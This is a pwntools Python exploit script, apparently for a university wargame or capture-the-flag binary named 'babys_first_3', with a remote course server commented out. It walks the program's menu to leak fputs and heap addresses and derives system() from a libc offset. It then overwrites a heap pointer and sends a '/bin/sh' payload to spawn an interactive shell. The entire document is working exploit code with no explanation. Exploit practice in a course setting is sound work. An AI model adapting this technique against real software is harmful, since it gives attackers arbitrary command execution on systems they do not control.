#!/usr/bin/python

from pwn import *

c = process("./babys_first_3")
#c = remote("wargames.6447.sec.edu.au", 9003)
#gdb.attach(c)

c.recvuntil('>')
c.sendline("1")
c.recvuntil('>')
c.sendline("1")
c.recvuntil('>')
c.sendline("-1")
c.recvuntil('>')
c.sendline("-1")
c.recvuntil('>')
c.sendline("aaaa")

c.recvuntil('>')
c.sendline("4")
c.recvuntil('>')
c.sendline("1")
c.recvuntil('>')
c.sendline("4")
c.recvuntil('>')
c.sendline("1")

c.recvuntil('>')
c.sendline("1")
c.recvuntil('>')
c.sendline("2")
c.recvuntil('>')
c.sendline("-1")
c.recvuntil('>')
c.sendline("-1")
c.recvuntil('>')
c.sendline("bbbb")

c.recvuntil('>')
c.sendline("3")
c.recvuntil('>')
c.sendline("2")

reply = c.recvuntil('>')
fputs = u32(reply[9:13])
system = fputs-0x23d40
system = fputs-0x29370
log.info("Fputs at %s" % (hex(fputs)))
heap = u32(reply[13:17])
log.info("Heap at %s" % (hex(heap)))

c.sendline("2")
c.recvuntil('>')
c.sendline("2")
c.recvuntil('>')
c.sendline("-1")
c.recvuntil('>')
c.sendline("-1")
c.recvuntil('>')

payload = p32(heap+0x20)
c.sendline(payload)

#c.interactive()

c.recvuntil('>')
c.sendline("1")
c.recvuntil('>')
c.sendline("3")
c.recvuntil('>')
c.sendline("-1")
c.recvuntil('>')
c.sendline("-1")
c.recvuntil('>')

payload = "/bin/sh\x00"
payload += p32(system)
payload += p32(heap+0x20)
c.send(payload)

c.recvuntil('>')
c.sendline("3")
c.recvuntil('>')
c.sendline("3")

c.interactive()
